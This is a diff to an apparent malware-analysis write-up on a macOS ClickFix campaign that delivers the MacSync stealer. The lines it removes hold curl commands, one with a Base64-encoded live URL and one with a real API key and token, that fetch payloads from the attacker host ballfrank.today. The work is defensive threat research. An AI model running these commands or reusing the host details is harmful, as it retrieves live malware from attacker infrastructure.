@@ -20,14 +20,7 @@ A curl command is appended which executes a Base64 chunk, decoded to reveal:
 hxxp[://]ballfrank[.]today/curl/270653f862f0ee21dce0a46e4801ec28db4ddc77b6fba9341b1b8db29909c514
 ```
 
-We can instead execute the following command to output the contents to a file, rather than executing it:
-
-```
-curl -kfsSL $(echo 'aHR0cDovL2JhbGxmcmFuay50b2RheS9jdXJsLzI3MDY1M2Y4NjJmMGVlMjFkY2UwYTQ2ZTQ4MDFlYzI4ZGI0ZGRjNzdiNmZiYTkzNDFiMWI4ZGIyOTkwOWM1MTQ=' | base64 -D) \
--o clickfix_payload.txt
-```
-
-This results in the following payload:
+I'll instead download the contents of this file without executing it, which results in:
 
 ```
 #!/bin/zsh
@@ -86,31 +79,7 @@ else
 fi
 ```
 
-I'll use the following script, keeping the headers and user-agent but just downloading the contents to a file rather than executing them:
-
-```
-#!/bin/zsh
-
-domain="ballfrank[.]today"
-token="270653f862f0ee21dce0a46e4801ec28db4ddc77b6fba9341b1b8db29909c514"
-api_key="5190ef1733183a0dc63fb623357f56d6"
-
-outfile="2nd_payload.txt"
-
-if [ $# -gt 0 ]; then
-    url="http://$domain/dynamic?txd=$token&pwd=$1"
-else
-    url="http://$domain/dynamic?txd=$token"
-fi
-
-curl -k --max-time 30 \
-    -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36" \
-    -H "api-key: $api_key" \
-    "$url" \
-    -o "$outfile"
-```
-
-This retrieves the following file for us, the MacSync information stealer payload:
+Execution results in the following MacSync information stealer payload:
 
 ```
 on filesizer(paths)
